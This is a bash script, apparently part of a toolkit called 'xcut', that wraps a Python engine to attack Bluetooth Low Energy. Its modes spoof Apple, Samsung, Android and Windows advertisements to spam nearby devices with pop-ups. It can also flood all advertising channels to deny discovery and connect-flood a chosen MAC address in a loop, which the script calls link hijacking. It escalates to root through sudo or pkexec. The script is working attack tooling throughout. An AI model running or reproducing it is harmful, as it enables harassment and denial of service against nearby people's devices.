#!/bin/bash
# xcut-ble - BLE advertisement spoofer (kernel MGMT channel).
#   on <mode> [arg]   add advertising instances (works with/without bluetoothd)
#                     modes: airtag|airpods|appletv|homepod|samsung|
#                            android <name>|windows <text>|ibeacon|all
#   off               remove all advertising instances
#   check             probe mgmt channel + list instances
#   scan [sec]        scan nearby BLE devices
#   jam [MAC]         SYN-2x burst flood all adv channels (discovery denial);
#                     with MAC also connect-floods that device (link hijack)
#   jam stop          stop burst + connect flood, clear instances
set -u

BIN="${BIN:-$(dirname "$(realpath "$0")")}"
# prefer a PATH-installed engine (pip/pipx), fall back to the sibling file
RAW="${DIS_BLE:-}"
if [ -z "$RAW" ]; then
    RAW="$(command -v xcut-ble-raw 2>/dev/null)" || RAW="$BIN/xcut-ble-raw"
fi
JAMPID="/tmp/xcut-jam.pid"

# The kernel MGMT channel only lets CAP_NET_ADMIN (root) sockets add
# advertising / read adv features; non-root gets PERMISSION_DENIED (and on
# some kernels an opaque ENOMEM). Re-exec elevated like the main "xcut".
require_root() {
    [ "$(id -u)" -eq 0 ] && return 0
    if command -v sudo >/dev/null 2>&1; then
        exec sudo "$0" "$@"
    fi
    if command -v pkexec >/dev/null 2>&1; then
        exec pkexec "$0" "$@"
    fi
    echo "xcut-ble: butuh root (sudo/pkexec) untuk akses MGMT channel" >&2
    exit 1
}

usage() {
    cat <<'EOF'
xcut-ble: BLE advertisement spoofer / soft-jammer (mgmt channel; no bluetoothd stop needed)
  on airtag|airpods|appletv|homepod|samsung|android <name>|windows [text]|ibeacon|all
  off              remove all advertising instances
  check            show adapter + instances via btmgmt
  scan [sec]       scan nearby BLE devices
  conn [mode]      CONNECTABLE (ADV_IND) adv spam: nearby devices get
                   connection-request prompts toward your spoofed payload
  burst [mode]     adv-churn flood (discovery denial, global effect)
  jam [BLE-MAC]    burst + optional connect-flood to jam a specific device
  jam stop         stop jam, clear everything
EOF
    exit 0
}

stop_jam() {
    pkill -9 -f "xcut-ble-raw burst" 2>/dev/null
    pkill -9 -f "xcut-ble-raw conn" 2>/dev/null
    pkill -9 -f "bluetoothctl connect" 2>/dev/null
    pkill -9 -f "bluetoothctl disconnect" 2>/dev/null
    if [ -e "$JAMPID" ]; then
        while read -r p; do kill -9 "$p" 2>/dev/null; done < "$JAMPID"
    fi
    python3 "$RAW" off >/dev/null 2>&1
    rm -f "$JAMPID"
}

case "${1:-}" in
    on)
        require_root "$@"
        echo "BLE spam: ${2:-airpods}"
        trap 'true' INT TERM HUP
        python3 "$RAW" on "${2:-airpods}" "${3:-}"
        ;;
    burst)
        require_root "$@"
        echo "BLE burst flood (soft-jam). Ctrl-C utk berhenti"
        python3 "$RAW" burst "${2:-}" "${3:-}"
        echo "burst berhenti - untuk jaga-jaga xcut ble jam stop"
        ;;
    conn)
        require_root "$@"
        echo "BLE connectable spam (request-conn): ${2:-all}. Ctrl-C utk berhenti"
        trap 'true' INT TERM HUP
        python3 "$RAW" conn "${2:-all}" "${3:-}"
        echo "conn berhenti - untuk jaga-jaga xcut ble off"
        ;;
    jam)
        require_root "$@"
        if [ "${2:-}" = "stop" ]; then
            stop_jam
            exit 0
        fi
        stop_jam >/dev/null
        echo "BLE soft-jam: global adv burst + [${2:-no target}]"
        echo "  Ctrl-C utk berhenti"
        if [ -n "${2:-}" ]; then
            mac="$2"
            echo "  connect-flooding $mac (link hijack)"
            : > "$JAMPID"
            ( while true; do
                  bluetoothctl connect "$mac" >/dev/null 2>&1
                  bluetoothctl disconnect "$mac" >/dev/null 2>&1
                  sleep 0.2
              done ) > /dev/null 2>&1 &
            echo $! > "$JAMPID"
            trap 'pkill -9 -f bluetoothctl 2>/dev/null; kill -9 "$(cat "$JAMPID")" 2>/dev/null; rm -f "$JAMPID"' EXIT INT TERM
        else
            rm -f "$JAMPID"
        fi
        python3 "$RAW" burst all
        pkill -9 -f "bluetoothctl connect" 2>/dev/null
        rm -f "$JAMPID"
        echo "jam berhenti, instance dibersihkan"
        ;;
    off)
        require_root "$@"
        python3 "$RAW" off
        ;;
    check)
        require_root "$@"
        python3 "$RAW" check
        btmgmt -i 0 advinfo 2>&1 || true
        ;;
    scan)
        sec="${2:-10}"
        echo "Scanning BLE for ${sec}s ..."
        timeout "$sec" bluetoothctl --timeout "$sec" scan on >/dev/null 2>&1
        bluetoothctl devices | sed 's/^Device //' | sort -u -f
        ;;
    *) usage ;;
esac